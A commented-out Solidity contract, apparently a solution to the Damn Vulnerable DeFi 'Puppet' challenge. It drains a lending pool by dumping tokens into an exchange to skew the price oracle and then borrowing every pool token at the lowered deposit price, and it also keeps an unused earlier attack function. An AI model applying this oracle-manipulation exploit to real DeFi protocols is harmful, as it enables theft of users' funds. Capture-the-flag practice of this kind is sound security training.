// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

// import "../DamnValuableToken.sol";
// import "./PuppetPool.sol";
// import "./IExchange.sol";
// import "hardhat/console.sol";

// /**
//  * @title StealFromPuppetv2
//  * @author Louis Law
//  */
// contract StealFromPuppetv2 {
//     PuppetPool private immutable pool;
//     IExchange private immutable exchange;
//     DamnValuableToken private immutable token;

//     constructor(
//         PuppetPool _pool,
//         IExchange _exchange,
//         DamnValuableToken _token,
//         uint256 token_amount,
//         uint256 deadline,
//         uint8 v,
//         bytes32 r,
//         bytes32 s
//     ) payable {
//         pool = _pool;
//         exchange = _exchange;
//         token = _token;
//         token.permit(
//             msg.sender,
//             address(this),
//             token_amount,
//             deadline,
//             v,
//             r,
//             s
//         );
//         token.transferFrom(msg.sender, address(this), token_amount);
//         require(
//             token.balanceOf(address(this)) == token_amount,
//             "unexpected token amount"
//         );

//         token.approve(address(exchange), token_amount);
//         exchange.tokenToEthSwapInput(token_amount, 1, deadline);
//         require(
//             token.balanceOf(address(exchange)) >= token_amount,
//             "token not transferred to exchange"
//         );

//         uint256 pool_token_amount = token.balanceOf(address(pool));
//         uint256 eth_deposit_required = pool.calculateDepositRequired(
//             pool_token_amount
//         );
//         require(msg.value >= eth_deposit_required, "not enough eth");

//         pool.borrow{value: eth_deposit_required}(pool_token_amount, msg.sender);
//     }

//     // function attack(uint256 _token_amount, uint256 _time) external payable {
//     //     console.log("attact - start");
//     //     token.transferFrom(msg.sender, address(this), _token_amount);
//     //     console.log("attact - transffered");
//     //     token.approve(address(exchange), _token_amount);
//     //     console.log("attact - approved");
//     //     exchange.addLiquidity{value: 1}(1, _token_amount, _time);
//     //     console.log("attact - addLiquidity ed");

//     //     pool.borrow{value: msg.value}(
//     //         calculateMaxTokenBorrow(msg.value),
//     //         address(this)
//     //     );
//     //     console.log("attact - borrowed");
//     // }

//     // function _callPermit(
//     //     address owner,
//     //     address spender,
//     //     uint256 value,
//     //     uint256 nonce,
//     //     uint256 deadline,
//     //     uint8 v,
//     //     bytes32 r,
//     //     bytes32 s
//     // ) internal {
//     //     token.permit(owner, spender, value, deadline, v, r, s);
//     // }
// }
